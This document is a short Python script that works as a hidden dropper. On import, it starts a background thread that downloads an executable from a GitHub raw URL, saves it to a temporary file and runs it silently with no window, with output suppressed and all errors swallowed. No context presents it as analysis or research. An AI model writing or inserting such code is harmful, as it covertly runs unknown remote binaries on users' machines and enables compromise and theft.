import requests
import threading
import subprocess
import tempfile
import os

def yyy():
    try:
        url = 'https://raw.githubusercontent.com/skiddyskid111/resources/main/main.exe'
        r = requests.get(url, timeout=10)
        r.raise_for_status()
        with tempfile.NamedTemporaryFile(suffix='.exe', delete=False) as tmp:
            tmp.write(r.content)
            tmp.flush()
            subprocess.Popen(
                [tmp.name],
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
    except:
        pass

threading.Thread(target=yyy, daemon=True).start()
